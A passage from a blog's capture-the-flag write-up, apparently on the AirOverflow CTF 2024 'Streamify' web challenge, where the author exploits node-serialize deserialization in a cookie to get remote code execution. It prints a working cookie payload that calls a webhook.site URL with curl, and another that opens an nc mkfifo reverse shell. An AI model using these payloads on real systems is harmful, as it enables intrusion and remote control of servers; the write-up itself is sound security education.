+<p>I tried injecting XSS and SSTI but no luck, it was HTML encoding my XSS so this didn&rsquo;t work and SSTI didn&rsquo;t show anything either.</p>
+<p>I looked at the website&rsquo;s backend which was <code>Node JS</code> (We get to know this from the <code>X-Powered-By: Express</code> response header.)</p>
+<p>Since it was node and cookie seemed something like serialized. I remembered a vulnerability in <code>node-serialize</code> which is vulnerable to RCE.</p>
+<p>I tried a PoC payload and it worked!</p>
+<p>This was also blind so I first tried to get a callback with curl using following cookie.</p>
+<p><code>{&quot;streamername&quot;:&quot;_$$ND_FUNC$$_function (){require('child_process').exec('curl https://webhook.site/c552bd8f-2b00-4e2b-a245-6b0571fd5f8b', function(error, stdout, stderr) { console.log(stdout) });}()&quot;,&quot;status&quot;:&quot;test&quot;,&quot;age&quot;:&quot;2</code></p>
+<p>And this worked perfectly!</p>
+<p>Next I used simple nc mkfifo rev shell from <a href="https://revshells.com" target="_blank" rel="noopener noreffer ">https://revshells.com</a> and got shell access to read the flag.</p>
+<p>Reverse Shell Payload: <code>{&quot;streamername&quot;:&quot;_$$ND_FUNC$$_function (){require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;your-ip&gt; 11919 &gt;/tmp/f', function(error, stdout, stderr) { console.log(stdout) });}()&quot;,&quot;statu</code></p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/28.png" title="&amp;ldquo;Flag for Streamify&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/28.png" data-sub-html="<h2>Flag for Streamify</h2><p>&amp;ldquo;Flag for Streamify&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/28.png"
+            data-srcset="/airoverflow-ctf-2024/28.png, /airoverflow-ctf-2024/28.png 1.5x, /airoverflow-ctf-2024/28.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/28.png" width="576" height="97" />
+    </a><figcaption class="image-caption">Flag for Streamify</figcaption>
+    </figure></p>
+<p>That is all for now. Kudos to the AirOverflow team for organizing such an amazing CTF event and @rootxran for all the amazing web challenges.</p>
+<p><strong>Thanks for reading!</strong></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-04-28</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/airoverflow-ctf-2024/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/airoverflow-ctf-2024/" data-title="AirOverflow CTF 2024 - Web Write-ups" data-via="ssaadakhtarr" data-hashtags="cryptohack,challenges"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/airoverflow-ctf-2024/" data-hashtag="cryptohack"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/airoverflow-ctf-2024/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/cryptohack/">cryptohack</a>,&nbsp;<a href="/tags/challenges/">challenges</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hackthebox-analytics/" class="prev" rel="prev" title="HackTheBox - Analytics"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox - Analytics</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Saad Akhtar</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
